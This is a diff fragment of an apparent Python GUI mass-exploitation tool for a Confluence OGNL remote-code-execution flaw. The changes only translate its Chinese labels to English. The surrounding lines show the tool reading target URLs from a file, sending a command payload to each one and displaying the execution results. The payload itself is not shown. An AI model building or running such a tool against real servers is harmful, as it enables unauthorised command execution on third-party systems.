@@ -37,17 +37,17 @@ def confluence_rce(target):
         confluence_text.insert(END,f"【×××】Can't find the used version for {target}\n")
         confluence_text.see(END)
         exec_payload = send_payload(target, cmd)
-        confluence_text.insert(END, f"【！！！！！！！！！！！！】{target}的执行结果为：" + exec_payload + "\n")
+        confluence_text.insert(END, f"[！！！！！！！！！！！！]{target} execution result is:" + exec_payload + "\n")
         confluence_text.see(END)
 def get_addr():
-    with open("修正后的url.txt","r") as f:
+    with open("corrected url.txt","r") as f:
         for address in f.readlines():
             address = address.strip()
             yield address
 def confluence_gui():
     confluence = Toplevel()
     confluence.geometry("1370x600")
-    confluence.title("ConfulenceONGL RCE一把梭（启动可能有点卡，请耐心等待，不要关闭或者乱点）")
+    confluence.title("ConfulenceONGL RCE [auto-muti-exp]")
     confluence.resizable(0, 0)
     logo = PhotoImage(file="./logo.ico")
     confluence.tk.call('wm', 'iconphoto', confluence._w, logo)
